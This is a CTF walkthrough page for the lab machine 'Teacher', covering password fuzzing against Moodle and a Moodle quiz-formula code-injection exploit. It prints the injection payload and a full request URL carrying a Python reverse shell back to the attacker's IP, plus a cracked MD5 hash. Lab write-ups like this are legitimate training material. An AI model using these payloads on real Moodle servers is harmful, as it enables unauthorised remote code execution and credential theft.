@@ -1,0 +1,256 @@
+---
+layout: default
+---
+<body class="wrap">
+  <header>
+  <div class="flexbox">
+    <nav class="main-nav hide-on-mobiles">
+      <ul>
+  <li class="">
+    <a href="/">Home</a>
+  </li>
+  <p>
+  This machine is showing only 1 open port on TCP and this one is the obvious port 80. 
+  </p>
+</ul>
+
+    </nav>
+  </div>
+</header>
+
+
+    <section class="news">
+    <div class="grid">
+
+
+
+      <div class="unit four-fifths">
+        <article>
+  <h2>
+    Teacher
+  </h2>
+  <span class="post-category">
+    <span class="label">
+      Walkthroughs
+    </span>
+  </span>
+  <div class="post-meta">
+    <span class="post-date">
+      20 April 2019
+    </span>
+  </div>
+  <p></p>
+  <div class="post-content">
+						<div class="embed-container">
+							<img src="./resources/machine.png" />
+						</div>
+</br>
+						
+    <p><strong>Machine: Teacher<br />
+OS: Linux<br />
+IP: 10.10.10.153</strong></p>
+<p>
+	<div>
+</div><p></p>
+						<div class="embed-container">
+							<img src="./resources/nmap.PNG" />
+						</div>
+</p>
+<div>
+<p>
+Only one port open - very small attacking surface.
+</br>
+</p>
+</br>
+<p>Accessing the webservice, you get a website.
+One of the pages have a remark about this file
+</p>
+</br>
+</div>
+<p>
+						<div class="embed-container">
+							<img src="./resources/viewcode.png" />
+						</div>
+</p>
+<p>Checking the mentioned pic
+</p>
+<p>
+						<div class="embed-container">
+							<img src="./resources/5.png" />
+						</div>
+</p>
+</br>
+<p>
+						<div class="embed-container">
+							<img src="./resources/downloadpic.png" />
+						</div>
+</p>
+</br>
+<p>
+	Apparently we have a username and part of a password.
+</p>
+<p>
+Username: Giovanni
+</p>
+<p>
+Password: Th4C00lTheacha{a character}
+</p>
+</br>
+<p>Making a bit of web directory enumation,</p>
+<p>
+						<div class="embed-container">
+							<img src="./resources/webdirenumeration.png" />
+						</div>
+</p>
+<div>
+<p>
+You can find out that Moodle instance it’s on the webserver. Note this is a very handy tool for teachers especially in universities and high schools that make life easier for tests during years. Easier does not mean also secured though… </p>
+</div>
+<p>
+						<div class="embed-container">
+							<img src="./resources/login.png" />
+						</div>
+</p>
+</br>
+<p>
+	Therefore let’s check which password our user has.
+</p>
+<p>
+						<div class="embed-container">
+							<img src="./resources/wfuzz.png" />
+						</div>
+</p>
+<div>
+	<p>
+You can notice the request with ‘#’ has a different response so it should be the answer! </p>
+</br>
+<p>
+Reaching the appropriate wfuzz command it’s based on burp analyses. 
+</p>
+</div>
+<p>
+						<div class="embed-container">
+							<img src="./resources/burp.png" />
+						</div>
+</p>
+<div>
+<p>
+Now that you are logged in, google code inject moodle or remote code execution moodle and the first interesting article about it it’s </p>
+</br>
+<p><a href="https://blog.ripstech.com/2018/moodle-remote-code-execution/">https://blog.ripstech.com/2018/moodle-remote-code-execution/</a></p></br>
+<p> 
+Here it’s described how a new quiz with a specific formula specified in the question can be exploited in order to gain remote code execution. And I whant to have a a remote shell on this server.
+</p>
+</br>
+<p>So create a new quiz.</p>
+
+</div>
+<p>
+						<div class="embed-container">
+							<img src="./resources/quiz.png" />
+						</div>
+</p>
+<div>
+<p>
+Add a question with the specified formula <i>/*{a*/`$_GET[0]`;//{x}}</i> as can be seen in the article.
+</br>
+</p>
+</div>
+<p>
+						<div class="embed-container">
+							<img src="./resources/questionformula.png" />
+						</div>
+</p>
+<div>
+<p>
+	Access the question:</p>
+</br>
+<p><i>
+http://10.10.10.153/moodle/question/question.php?returnurl=%2Fmod%2Fquiz%2Fedit.php%3Fcmid%3D8%26addonpage%3D0&appendqnumstring=addquestion&scrollpos=0&id=10&wizardnow=datasetitems&cmid=8&0=(python%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2210.10.13.106%22,1234));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);%27)</i></p>
+</div>
+<p>
+						<div class="embed-container">
+							<img src="./resources/reverseshell.png" />
+						</div>
+</p>
+</br>
+<div>
+And we have a shell
+</div>
+<p>
+						<div class="embed-container">
+							<img src="./resources/dbconfig.png" />
+						</div>
+</p>
+</br>
+<div>
+And a username and password for DB
+</div>
+<p>
+						<div class="embed-container">
+							<img src="./resources/usertable.png" />
+						</div>
+</p>
+
+
+</br>
+<div>
+So we found a MD5 password for Giovanni: 7a860966115182402ed06375cf0a22af
+</div>
+<p>
+						<div class="embed-container">
+							<img src="./resources/md5decrypt.png" />
+						</div>
+</p>
+
+
+</br>
+<div>
+Seems he got expelled :( And here we got the user flag
+</div>
+<p>
+						<div class="embed-container">
+							<img src="./resources/userflag.png" />
+						</div>
+</p>
+
+
+</br>
+<div>
+Root was much easier than expected as I was able to make a symlink to a directory that was created by root :)
+</div>
+<p>
+						<div class="embed-container">
+							<img src="./resources/rootflag.png" />
+						</div>
+</p>
+
+</br>
+<div>
+I hope you enjoyed the write-up and didn't made you wasting time. Drop me a cup of coffee for Sundays (<a href="https://ko-fi.com/y2xhcmtrzw50"> https://ko-fi.com/y2xhcmtrzw50 </a>) or email me kryptoniteclark@protonmail.com :)
+</div>
+</div>
+</article>
+
+<!-- Default Statcounter code for Clarkkent-repo.github.io
+Curling https://clarkkent-repo.github.io/curling/ -->
+<script type="text/javascript">
+var sc_project=11978300; 
+var sc_invisible=1; 
+var sc_security="bc06325b"; 
+var sc_https=1; 
+</script>
+<script type="text/javascript"
+src="https://www.statcounter.com/counter/counter.js"
+async></script>
+<noscript><div class="statcounter"><a title="Web Analytics
+Made Easy - StatCounter" href="https://statcounter.com/"
+target="_blank"><img class="statcounter"
+src="https://c.statcounter.com/11978300/0/bc06325b/1/"
+alt="Web Analytics Made Easy -
+StatCounter"></a></div></noscript>
+<!-- End of Statcounter Code -->
+
+
+      </div>
+</body>
